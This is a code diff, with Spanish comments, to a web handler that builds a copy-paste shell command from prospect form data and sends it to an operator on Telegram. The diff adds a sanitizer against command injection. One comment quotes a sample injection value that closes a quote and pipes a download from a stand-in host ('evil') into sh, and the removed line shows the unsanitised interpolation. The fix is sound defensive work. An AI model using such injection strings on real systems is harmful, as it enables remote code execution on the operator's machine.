@@ -30,6 +30,13 @@ function rateLimited(ip) {
 
 const clip = (s, n) => String(s ?? "").slice(0, n).trim();
 
+// Sanea un valor para incrustarlo en el "comando sugerido" que se manda a Telegram para que el
+// operador lo copie/pegue a una shell. Quita comillas, $, backtick, ; | & < > ( ) y control chars →
+// aunque el prospecto ponga negocio='X"; curl evil|sh #', el comando resultante NO puede inyectar
+// otro comando al pegarse (ship-review 2026-07-16). Deja letras/números/espacios y puntuación segura
+// de nombres/URLs; el nombre crudo del negocio sigue visible en el resto del ping (no en la shell).
+const shellSafe = (s) => String(s ?? "").replace(/[^\p{L}\p{N} ._\-:/?#=@]/gu, "").slice(0, 120);
+
 // Allowlist de `detail` para la respuesta PÚBLICA. crm.js ya sanea en origen (no propaga el mensaje
 // crudo de Odoo, que puede eco-ar PII — ship-review 2026-07-13), pero ésta es la superficie expuesta a
 // internet: defensa en profundidad. Sólo dejamos pasar tokens diagnósticos que genera NUESTRO código;
@@ -111,7 +118,8 @@ module.exports = async (req, res) => {
 
     // Ping accionable a Telegram
     if (TG_TOKEN && TG_CHAT) {
-      const cmd = `railway run python scripts/demo_bot.py --prospecto ${p.negocio.toLowerCase().replace(/[^a-z0-9]+/g, "-").slice(0, 26)} --display "${p.negocio}"${p.sitio ? ` --sitio ${p.sitio}` : ""}`;
+      const slug = p.negocio.toLowerCase().replace(/[^a-z0-9]+/g, "-").slice(0, 26);
+      const cmd = `railway run python scripts/demo_bot.py --prospecto ${slug} --display "${shellSafe(p.negocio)}"${p.sitio ? ` --sitio "${shellSafe(p.sitio)}"` : ""}`;
       const text = [
         `🚀 ACTIVACIÓN ${p.plan.toUpperCase()}`,
         `👤 ${p.nombre} · ${p.negocio} (${p.giro})`,
@@ -137,3 +145,6 @@ module.exports = async (req, res) => {
     return res.status(500).json({ error: "Error registrando tu solicitud." });
   }
 };
+
+// Exportado sólo para test/onboarding_cmd.test.js (no es parte del contrato del handler Vercel).
+module.exports.__shellSafe = shellSafe;
